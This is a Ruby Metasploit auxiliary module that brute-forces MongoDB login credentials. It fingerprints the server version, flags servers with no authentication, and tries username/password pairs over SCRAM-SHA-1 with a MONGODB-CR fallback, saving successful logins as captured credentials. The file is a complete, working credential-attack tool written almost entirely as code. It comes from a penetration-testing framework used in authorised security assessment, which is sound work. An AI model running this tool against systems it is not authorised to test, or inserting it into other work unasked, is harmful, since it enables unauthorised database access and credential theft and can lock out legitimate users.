##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'bson'
require 'openssl'
require 'digest'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MongoDB Login Utility',
        'Description' => %q{
          This module attempts to brute force authentication credentials for MongoDB.
          It supports both SCRAM-SHA-1 (MongoDB 3.0+) and falls back to legacy
          MONGODB-CR authentication if SCRAM is unsupported by the target server.
        },
        'References' => [
          [ 'URL', 'https://docs.mongodb.com/manual/reference/mongodb-wire-protocol/' ],
          [ 'URL', 'https://github.com/mongodb/specifications/blob/master/source/auth/auth.rst/' ]
        ],
        'Author' => [
          'Gregory Man <man.gregory[at]gmail.com>',
          'h00die' # SCRAM and updating compatibility for MongoDB 3.0+ and later
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => CRASH_SAFE,
          'SideEffects' => IOC_IN_LOGS, ACCOUNT_LOCKOUTS
        }
      )
    )

    register_options(
      [
        Opt::RPORT(27017),
        OptString.new('DB', [ true, 'Database to use', 'admin'])
      ]
    )
  end

  def run_host(ip)
    print_status("Scanning IP: #{ip}")
    begin
      connect

      version = get_version
      ver_info = version ? " (version #{version})" : ''

      if require_auth?
        print_status("#{peer} - Mongo server#{ver_info} requires authentication")
        each_user_pass do |user, pass|
          do_login(user, pass)
        end
      else
        report_vuln(
          host: rhost,
          port: rport,
          name: 'MongoDB No Authentication',
          refs: references,
          exploited_at: Time.now.utc,
          info: "Mongo server has no authentication.#{ver_info}"
        )
        print_good("Mongo server #{ip}#{ver_info} doesn't use authentication")
      end
      disconnect
    rescue StandardError => e
      print_error "Unable to connect: #{e}"
      return
    end
  end

  def get_version
    cmd = BSON::Document.new({ 'buildInfo' => BSON::Int32.new(1) })
    pkt = build_cmd_packet('admin.$cmd', cmd.to_bson.to_s)

    sock.put(pkt)
    resp = sock.get_once(-1, 5)

    return nil unless resp && resp.length > 36

    buffer = BSON::ByteBuffer.new(resp[36..])
    doc = BSON::Document.from_bson(buffer)

    if doc && doc['version']
      version_str = doc['version']
      report_service(
        host: rhost,
        port: rport,
        name: 'mongodb',
        proto: 'tcp',
        info: "MongoDB #{version_str}"
      )
      return version_str
    end
    nil
  rescue StandardError => e
    vprint_error("#{peer} - Failed to parse version from buildInfo: #{e.message}")
    nil
  end

  def require_auth?
    cmd = BSON::Document.new({ 'listDatabases' => BSON::Int32.new(1) })
    list_db_pkt = build_cmd_packet('admin.$cmd', cmd.to_bson.to_s)

    sock.put(list_db_pkt)
    auth_resp = sock.get_once(-1, 5)

    have_auth_error?(auth_resp)
  end

  def do_login(user, password)
    vprint_status("Trying user: #{user}, password: #{password}")

    # 1. Try SCRAM-SHA-1 first (MongoDB 3.0+)
    scram_status = auth_scram_sha1(user, password)
    return scram_status if scram_status == :next_user

    # 2. Fallback to MONGODB-CR if SCRAM failed or is unsupported
    vprint_status("#{peer} - SCRAM-SHA-1 not accepted or failed; trying MONGODB-CR fallback...")
    nonce = get_nonce
    if nonce.present?
      cr_status = auth_cr(user, password, nonce)
      return cr_status if cr_status == :next_user
    end

    nil
  end

  # SCRAM-SHA-1 Handshake (MongoDB 3.0+)
  def auth_scram_sha1(user, password)
    db = datastore['DB']
    digest_pass = Digest::MD5.hexdigest("#{user}:mongo:#{password}")

    client_nonce = Rex::Text.rand_text_alphanumeric(24)
    auth_payload = "n=#{user},r=#{client_nonce}"
    client_first_bare = auth_payload
    client_first_message = "n,,#{auth_payload}"

    sasl_start_cmd = BSON::Document.new({
      'saslStart' => BSON::Int32.new(1),
      'mechanism' => 'SCRAM-SHA-1',
      'payload' => BSON::Binary.new(client_first_message)
    })

    pkt = build_cmd_packet("#{db}.$cmd", sasl_start_cmd.to_bson.to_s)
    sock.put(pkt)
    resp = sock.get_once(-1, 5)

    return nil unless resp && resp.length > 36

    reply = parse_doc(resp)
    return nil unless reply && reply['ok'].to_i == 1

    conversation_id = reply['conversationId']
    server_payload = reply['payload'].data
    server_vars = parse_scram_payload(server_payload)

    server_nonce = server_vars['r']
    salt = Rex::Text.decode_base64(server_vars['s'])
    iterations = server_vars['i'].to_i

    salted_password = OpenSSL::PKCS5.pbkdf2_hmac(
      digest_pass,
      salt,
      iterations,
      20,
      OpenSSL::Digest.new('SHA1')
    )

    client_key = OpenSSL::HMAC.digest('sha1', salted_password, 'Client Key')
    stored_key = OpenSSL::Digest::SHA1.digest(client_key)
    client_final_without_proof = "c=biws,r=#{server_nonce}"
    auth_message = "#{client_first_bare},#{server_payload},#{client_final_without_proof}"

    client_signature = OpenSSL::HMAC.digest('sha1', stored_key, auth_message)
    client_proof = Rex::Text.xor(client_key, client_signature)
    client_final_message = "#{client_final_without_proof},p=#{Rex::Text.encode_base64(client_proof)}"

    conv_id_bson = conversation_id.is_a?(Integer) ? BSON::Int32.new(conversation_id) : conversation_id

    sasl_continue_cmd = BSON::Document.new({
      'saslContinue' => BSON::Int32.new(1),
      'conversationId' => conv_id_bson,
      'payload' => BSON::Binary.new(client_final_message)
    })

    pkt = build_cmd_packet("#{db}.$cmd", sasl_continue_cmd.to_bson.to_s)
    sock.put(pkt)
    resp = sock.get_once(-1, 5)

    return nil unless resp && resp.length > 36

    reply = parse_doc(resp)
    if reply && reply['ok'].to_i == 1
      print_good("#{rhost} - SUCCESSFUL LOGIN '#{user}' : '#{password}' (SCRAM-SHA-1)")
      report_cred(
        ip: rhost,
        port: rport,
        service_name: 'mongodb',
        user: user,
        password: password,
        proof: reply.inspect
      )
      return :next_user
    end

    nil
  rescue StandardError => e
    vprint_error("#{peer} - SCRAM-SHA-1 exception: #{e.message}")
    nil
  end

  # Legacy MONGODB-CR Handshake (MongoDB < 3.0)
  def auth_cr(user, password, nonce)
    db = datastore['DB']
    key = Rex::Text.md5(nonce + user + Rex::Text.md5("#{user}:mongo:#{password}"))

    cmd = BSON::Document.new({
      'authenticate' => BSON::Int32.new(1),
      'user' => user,
      'nonce' => nonce,
      'key' => key
    })

    packet = build_cmd_packet("#{db}.$cmd", cmd.to_bson.to_s)
    sock.put(packet)
    response = sock.get_once(-1, 5)

    return nil unless response && response.length > 36

    reply = parse_doc(response)
    if reply && reply['ok'].to_i == 1
      print_good("#{rhost} - SUCCESSFUL LOGIN '#{user}' : '#{password}' (MONGODB-CR)")
      report_cred(
        ip: rhost,
        port: rport,
        service_name: 'mongodb',
        user: user,
        password: password,
        proof: reply.inspect
      )
      return :next_user
    end

    nil
  rescue StandardError => e
    vprint_error("#{peer} - MONGODB-CR exception: #{e.message}")
    nil
  end

  def parse_scram_payload(payload)
    payload.split(',').each_with_object({}) do |var, hash|
      k, v = var.split('=', 2)
      hash[k] = v if k && v
    end
  end

  def parse_doc(response)
    return nil if response.nil? || response.length <= 36

    buffer = BSON::ByteBuffer.new(response[36..])
    BSON::Document.from_bson(buffer)
  rescue StandardError
    nil
  end

  def build_cmd_packet(coll_name, bson_payload)
    coll_str = "#{coll_name}\x00"
    req_id = Rex::Text.rand_text(4)
    msg_len = 16 + 4 + coll_str.length + 4 + 4 + bson_payload.length

    packet = [msg_len].pack('V')
    packet << req_id
    packet << "\x00\x00\x00\x00"            # responseTo: 0
    packet << "\xd4\x07\x00\x00"            # OP_QUERY
    packet << "\x00\x00\x00\x00"            # flags
    packet << coll_str
    packet << "\x00\x00\x00\x00"            # numberToSkip: 0
    packet << "\x01\x00\x00\x00"            # numberToReturn: 1
    packet << bson_payload
    packet
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def get_nonce
    cmd = BSON::Document.new({ 'getnonce' => BSON::Int32.new(1) })
    pkt = build_cmd_packet("#{datastore['DB']}.$cmd", cmd.to_bson.to_s)

    sock.put(pkt)
    response = sock.get_once(-1, 5)
    return '' unless response && response.length > 36

    doc = parse_doc(response)
    doc && doc['ok'].to_i == 1 ? doc['nonce'].to_s : ''
  end

  def have_auth_error?(response)
    return true if response.nil? || response.length <= 36

    doc = parse_doc(response)
    if doc
      return true if doc['ok'].to_i == 0 || doc['errmsg']
    else
      documents = response[36..]
      return documents.include?('errmsg') || documents.include?('unauthorized') || documents.include?('requires authentication')
    end

    false
  end
end
